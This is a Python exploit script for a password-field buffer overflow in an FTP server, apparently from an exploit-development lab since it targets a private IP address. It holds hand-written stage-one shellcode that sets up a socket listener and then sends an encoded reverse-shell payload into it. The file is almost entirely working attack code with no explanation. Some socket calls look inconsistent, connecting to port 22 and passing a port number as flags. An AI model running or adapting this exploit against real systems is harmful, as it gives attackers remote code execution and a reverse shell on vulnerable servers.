#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
from ftplib import FTP
from struct import pack
from time import sleep

host = '172.16.192.167'
port = 21
max_size = 3500
eip_offset = 2559
 
rev_met_7887 =  ""
rev_met_7887 += "\xbb\x4e\x27\x19\xfe\xdb\xca\xd9\x74\x24\xf4"
rev_met_7887 += "\x5d\x2b\xc9\xb1\x56\x31\x5d\x13\x03\x5d\x13"
rev_met_7887 += "\x83\xed\xb2\xc5\xec\x02\xa2\x88\x0f\xfb\x32"
rev_met_7887 += "\xed\x86\x1e\x03\x2d\xfc\x6b\x33\x9d\x76\x39"
rev_met_7887 += "\xbf\x56\xda\xaa\x34\x1a\xf3\xdd\xfd\x91\x25"
rev_met_7887 += "\xd3\xfe\x8a\x16\x72\x7c\xd1\x4a\x54\xbd\x1a"
rev_met_7887 += "\x9f\x95\xfa\x47\x52\xc7\x53\x03\xc1\xf8\xd0"
rev_met_7887 += "\x59\xda\x73\xaa\x4c\x5a\x67\x7a\x6e\x4b\x36"
rev_met_7887 += "\xf1\x29\x4b\xb8\xd6\x41\xc2\xa2\x3b\x6f\x9c"
rev_met_7887 += "\x59\x8f\x1b\x1f\x88\xde\xe4\x8c\xf5\xef\x16"
rev_met_7887 += "\xcc\x32\xd7\xc8\xbb\x4a\x24\x74\xbc\x88\x57"
rev_met_7887 += "\xa2\x49\x0b\xff\x21\xe9\xf7\xfe\xe6\x6c\x73"
rev_met_7887 += "\x0c\x42\xfa\xdb\x10\x55\x2f\x50\x2c\xde\xce"
rev_met_7887 += "\xb7\xa5\xa4\xf4\x13\xee\x7f\x94\x02\x4a\xd1"
rev_met_7887 += "\xa9\x55\x35\x8e\x0f\x1d\xdb\xdb\x3d\x7c\xb3"
rev_met_7887 += "\x28\x0c\x7f\x43\x27\x07\x0c\x71\xe8\xb3\x9a"
rev_met_7887 += "\x39\x61\x1a\x5c\x48\x65\x9d\xb2\xf2\xe6\x63"
rev_met_7887 += "\x33\x02\x2e\xa0\x67\x52\x58\x01\x08\x39\x98"
rev_met_7887 += "\xae\xdd\xd7\x92\x38\x72\x37\x63\x52\xe2\x35"
rev_met_7887 += "\x63\xbd\x3c\xb0\x85\x91\x92\x92\x19\x52\x43"
rev_met_7887 += "\x52\xca\x3a\x89\x5d\x35\x5a\xb2\xb4\x5e\xf1"
rev_met_7887 += "\x5d\x60\x36\x6e\xc7\x29\xcc\x0f\x08\xe4\xa8"
rev_met_7887 += "\x10\x82\x0c\x4c\xde\x63\x65\x5e\x37\x14\x85"
rev_met_7887 += "\x9e\xc8\xb1\x85\xf4\xcc\x13\xd2\x60\xcf\x42"
rev_met_7887 += "\x14\x2f\x30\xa1\x27\x28\xce\x34\x11\x42\xf9"
rev_met_7887 += "\xa2\x1d\x3c\x06\x23\x9d\xbc\x50\x29\x9d\xd4"
rev_met_7887 += "\x04\x09\xce\xc1\x4a\x84\x63\x5a\xdf\x27\xd5"
rev_met_7887 += "\x0e\x48\x40\xdb\x69\xbe\xcf\x24\x5c\xbc\x08"
rev_met_7887 += "\xda\x22\xeb\xb0\xb2\xdc\xab\x40\x42\xb7\x2b"
rev_met_7887 += "\x11\x2a\x4c\x03\x9e\x9a\xad\x8e\xf7\xb2\x24"
rev_met_7887 += "\x5f\xb5\x23\x38\x4a\x1b\xfd\x39\x79\x80\x0e"
rev_met_7887 += "\x43\xf2\x37\xef\xb4\x1a\x5c\xf0\xb4\x22\x62"
rev_met_7887 += "\xcd\x62\x1b\x10\x10\xb7\x18\x2b\x27\x9a\x09"
rev_met_7887 += "\xa6\x47\x88\x4a\xe3"


exploit = "" 
exploit += "\xB0\x06"           		#    MOV AL,6
exploit += "\x50"           			#    PUSH EAX
exploit += "\xB0\x01"           		#    MOV AL,1
exploit += "\x50"           			#    PUSH EAX
exploit += "\x40"						# 	 INC EAX
exploit += "\x50"           			#    PUSH EAX
exploit += "\xBB\x44\x9E\x62\x45"  		#    MOV EBX,45629E44
exploit += "\xC1\xEB\x08"     		    #    SHR EBX,8
exploit += "\xFF\xD3"					# 	 CALL EBX ; socket(2,1,6)

exploit += "\x8B\xF8"	             	#    MOV EDI,EAX ; store socket handle
exploit += "\x83\xEC\x28" 				#    SUB ESP,28
exploit += "\x54" 						#    PUSH ESP
exploit += "\x59" 						#    POP ECX
exploit += "\xC6\x01\x02" 				#    MOV BYTE PTR DS:[ECX],2
exploit += "\xC6\x41\x03\x16"	        #	 MOV BYTE PTR DS:[ECX +3],16
exploit += "\x6A\x10" 					#    PUSH 10
exploit += "\x51"  						#    PUSH ECX
exploit += "\x57"  						#    PUSH EDI
exploit += "\x66\xBB\xA4\x62" 			#    MOV BX,62A4
exploit += "\xFF\xD3"					# 	 CALL EBX ; bind(socket handle,socket addr struct,10)

exploit += "\x66\xBB\x86\x62"   	    #    MOV BX,6286
exploit += "\x6A\x7F"				    #    PUSH 7F
exploit += "\x57"					    #    PUSH EDI
exploit += "\xFF\xD3"				    #    CALL EBX

exploit += "\xB3\xF8"    				#    MOV BL,0F8
exploit += "\x50"     					#    PUSH EAX
exploit += "\x50"     					#    PUSH EAX
exploit += "\x57"     					#    PUSH EDX
exploit += "\xFF\xD3"				    #    CALL EBX

exploit += "\x8B\xF8"	             	#    MOV EDI,EAX ; store accept handle
exploit += "\x33\xD2" 				    #    XOR EDX,EDX
exploit += "\x52"   					#    PUSH EDX
exploit += "\xB6\x02"   				#    MOV DH,2
exploit += "\x52"					    #    PUSH EDX
exploit += "\x54"					    #    PUSH ESP
exploit += "\x59"					    #    POP ECX
exploit += "\x66\x81\xC1\x99\x0F"       #    ADD CX,0F81
exploit += "\x51"					    #    PUSH ECX
exploit += "\xB3\x74"				    #    MOV BL,74
exploit += "\x57"				    	#    push EDI	
exploit += "\xFF\xD3" 				    #    CALL EBX

payload = "PASS "
payload += "\x2c" + "A" * eip_offset
payload += "\xEB\x0e\x90\x90"
payload += pack("<L",0x10012462)
payload += "\x90" * 10
payload += exploit
# payload += "E" * (max_size - len(payload))
payload += "\x90" * 20

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(2048)
print "[*] Sending USER anonymous"
s.send("USER anonymous\r\n")
print s.recv(2048)
s.send(payload + "\r\n")

print "[*] Send Payload 1 To Target: {0} on Port: {1}".format(host,port)
sleep(2)	# Need time to pass exception since SEH based
print "[*] Sleeping for 2 seconds ...."
b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
b.connect((host, 22))
b.send(rev_met_7887, port+1)

print "[*] Send Payload 2 To Target: {0} on Port: {1}".format(host,port+1)



# 0045629E   $-FF25 9CE74700  JMP DWORD PTR DS:[<&WSOCK32.#23>]        ;  WS2_32.socket (2,1,0)
# 004562A4   $-FF25 A0E74700  JMP DWORD PTR DS:[<&WSOCK32.#2>]         ;  WS2_32.bind
# 00456286   $-FF25 8CE74700  JMP DWORD PTR DS:[<&WSOCK32.#13>]        ;  WS2_32.listen
# 004562F8   $-FF25 48E74700  JMP DWORD PTR DS:[<&WSOCK32.#1>]         ;  WS2_32.accept
# 00456274   $-FF25 80E74700  JMP DWORD PTR DS:[<&WSOCK32.#16>]        ;  WSOCK32.recv
